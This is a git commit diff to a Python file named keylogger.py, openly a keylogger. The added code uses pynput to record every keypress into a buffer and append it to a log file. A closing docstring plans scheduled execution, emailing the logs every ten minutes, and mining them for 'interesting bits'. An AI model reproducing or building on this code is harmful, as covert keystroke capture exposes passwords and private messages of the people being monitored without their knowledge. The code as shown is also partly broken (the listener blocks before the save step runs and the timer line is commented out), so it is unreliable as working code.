b8701e1acd604adde2a33dcb2634f472b92f7c32
Andranik Sahakyan <8908029+andranik-sahakyan@users.noreply.github.com>
2018-04-04 09:24:47 -0700

    Optimizations

--- keylogger.py
+++ keylogger.py
@@ -1,40 +1,43 @@
+#!/usr/bin/env python
+
 from pynput.keyboard import Key, Listener
 from datetime import date
 import psutil
 import os
 import threading
 
+
 PATH = os.path.dirname(os.path.abspath(__file__))
 log = ''
 
-def on_press(key):
-    log += key + ' '
 
-def isRunning(processName):
-    for pid in psutil.pids():
-        p = psutil.Process(pid)
-        if p.name() == processName:
-            return True
-    return False
+def on_press(key):
+    global log
+    log += str(key)
+
 
 def saveLog(log):
-    with open('{}\\{}_keyslogged.txt'.format(PATH, date.today()), 'a') as f:
-        f.write(log +'\n')
+    with open('log.txt', 'a') as f:
+        f.write(log + '\n')
+
 
 def writeSchedule(log, interval):
-    threading.Timer(float(interval), writeSchedule).start()
+    # threading.Timer(float(interval), writeSchedule).start()
     saveLog(log)
     return ''
 
+
 with Listener(on_press=on_press) as listener:
     listener.join()
+
+
 log = writeSchedule(log, 20)
 
-"""
-create buffer and save after every t seconds
-create a task in task scheduler.
-send to email aevery 10 min
-sister script that downloads emails
-anyalize logs to find interesting bits
-"""
 
+"""
+Create buffer and save after every t seconds
+Create a task in task scheduler.
+Send logs to email every 10 min
+Companion script downloads emails
+Analyze logs to find interesting bits
+"""
